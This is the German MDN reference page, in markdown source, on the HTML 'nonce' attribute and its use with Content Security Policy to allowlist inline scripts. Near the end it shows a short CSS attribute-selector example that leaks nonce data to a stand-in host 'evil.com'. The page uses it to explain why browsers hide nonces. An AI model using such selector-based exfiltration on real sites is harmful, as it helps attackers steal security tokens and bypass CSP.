---
title: nonce
slug: Web/HTML/Global_attributes/nonce
l10n:
  sourceCommit: 926f83641b980fcda58914649748b0368eeca1cd
---

{{HTMLSidebar("Global_attributes")}}

Das **`nonce`** [globale Attribut](/de/docs/Web/HTML/Global_attributes)
ist ein Inhaltsattribut, das eine kryptografische Nonce ("number used once") definiert, welche von der
[Content Security Policy](/de/docs/Web/HTTP/CSP) verwendet werden kann, um zu bestimmen, ob ein bestimmter Abruf für ein bestimmtes Element fortgesetzt werden darf.

## Beschreibung

Das `nonce`-Attribut ist nützlich, um bestimmte Elemente auf die Allowlist zu setzen, wie z.B. ein bestimmtes Inline-Skript oder Stil-Elemente.
Es kann Ihnen helfen, die Verwendung der [CSP](/de/docs/Web/HTTP/CSP) `unsafe-inline`-Direktive zu vermeiden, die _alle_ Inline-Skripte oder -Stile auf die Allowlist setzen würde.

> [!NOTE]
> Verwenden Sie `nonce` nur in Fällen, in denen Sie keine Möglichkeit haben, unsichere Inline-Skript-
> oder Stil-Inhalte zu vermeiden. Wenn Sie `nonce` nicht benötigen, verwenden Sie es nicht. Wenn Ihr Skript statisch ist, könnten Sie stattdessen einen CSP-Hash verwenden.
> (Siehe Verwendungshinweise zu [unsicheren Inline-Skripten](/de/docs/Web/HTTP/Headers/Content-Security-Policy/script-src#unsafe_inline_script).)
> Versuchen Sie immer, die [CSP](/de/docs/Web/HTTP/CSP)-Schutzmaßnahmen voll auszunutzen und vermeiden Sie Nonces oder unsichere Inline-Skripte wann immer möglich.

### Verwendung von nonce zur Allowlist einer \<script>-Element

Es gibt einige Schritte, um ein Inline-Skript mit dem Nonce-Mechanismus auf die Allowlist zu setzen:

#### Generierung von Werten

Generieren Sie von Ihrem Webserver aus eine zufällige, base64-kodierte Zeichenfolge von mindestens 128 Bit Daten aus einem kryptografisch sicheren Zufallszahlengenerator. Nonces sollten jedes Mal anders generiert werden, wenn die Seite geladen wird (Nonce nur einmal!). Zum Beispiel in Node.js:

```js
const crypto = require("crypto");
crypto.randomBytes(16).toString("base64");
// '8IBTHwOdqNKAWeKl7plt8g=='
```

#### Allowlisting von Inline-Skript

Die auf Ihrem Backend generierte Nonce sollte nun für das Inline-Skript verwendet werden, das Sie auf die Allowlist setzen möchten:

```html
<script nonce="8IBTHwOdqNKAWeKl7plt8g==">
  // …
</script>
```

#### Senden einer Nonce mit einem CSP-Header

Abschließend müssen Sie den Nonce-Wert in einem
[`Content-Security-Policy`](/de/docs/Web/HTTP/Headers/Content-Security-Policy)-Header senden
(dem `nonce-` voranstellen):

```http
Content-Security-Policy: script-src 'nonce-8IBTHwOdqNKAWeKl7plt8g=='
```

### Zugriff auf Nonces und Verbergen von Nonces

Aus Sicherheitsgründen wird das `nonce`-Inhaltsattribut ausgeblendet (ein leerer String wird zurückgegeben).

```js example-bad
script.getAttribute("nonce"); // returns empty string
```

Die [`nonce`](/de/docs/Web/API/HTMLElement/nonce)-Eigenschaft ist der einzige Weg, um auf Nonces zuzugreifen:

```js example-good
script.nonce; // returns nonce value
```

Das Verbergen von Nonces hilft zu verhindern, dass Angreifer Noncedaten über Mechanismen exfiltrieren, die Daten aus Inhaltsattributen extrahieren können, wie:

```css example-bad
script[nonce~="whatever"] {
  background: url("https://evil.com/nonce?whatever");
}
```

## Spezifikationen

{{Specifications}}

## Browser-Kompatibilität

{{Compat}}

## Siehe auch

- [`HTMLElement.nonce`](/de/docs/Web/API/HTMLElement/nonce)
- [Content Security Policy](/de/docs/Web/HTTP/CSP)
- CSP: [`script-src`](/de/docs/Web/HTTP/Headers/Content-Security-Policy/script-src)
